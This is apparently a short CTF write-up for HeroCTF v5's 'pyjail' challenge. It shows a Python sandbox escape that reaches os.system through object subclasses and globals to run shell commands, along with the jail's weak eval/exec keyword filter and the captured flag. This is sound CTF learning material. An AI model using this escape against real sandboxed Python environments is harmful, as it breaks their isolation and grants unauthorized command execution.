# HeroCTF v5 <!-- omit in toc -->

<!-- ctf link -->
https://ctf.heroctf.fr/


- [pyjail](#pyjail)


## pyjail

### SOLUTION <!-- omit in toc -->

https://graneed.hatenablog.com/entry/2018/09/09/020759#Python-for-fun

を参考にしました。

```python
print(().__class__.__bases__[0].__subclasses__()[109])
<class 'codecs.StreamReaderWriter'>
print(().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'])
print(().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'].modules['os'])
print(().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].system("pwd"))
().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].system("ls")
entry.sh
pyjail.py
().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__["sys"].modules["os"].system("cat ./pyjail.py")
#! /usr/bin/python3

# FLAG : Hero{nooooo_y0u_3sc4p3d!!}

def jail():
    user_input = input(">> ")

    filtered = ["eval", "exec"]

    valid_input = True
    for f in filtered:
        if f in user_input:
            print("You're trying something fancy aren't u ?")
            valid_input = False
            break
    for l in user_input:
        if ord(l) < 23 or ord(l) > 126:
            print("You're trying something fancy aren't u ?")
            valid_input = False
            break

    if valid_input:
        try:
            exec(user_input, {'__builtins__':{'print': print, 'globals': globals}}, {})
        except:
            print("An error occured. But which...")

def main():
    try:
        while True:
            jail()
    except KeyboardInterrupt:
        print("Bye")

if __name__ == "__main__":
    main()
```


### FLAG <!-- omit in toc -->

```bash
Hero{nooooo_y0u_3sc4p3d!!}
```
### REF <!-- omit in toc -->

https://graneed.hatenablog.com/entry/2018/09/09/020759#Python-for-fun

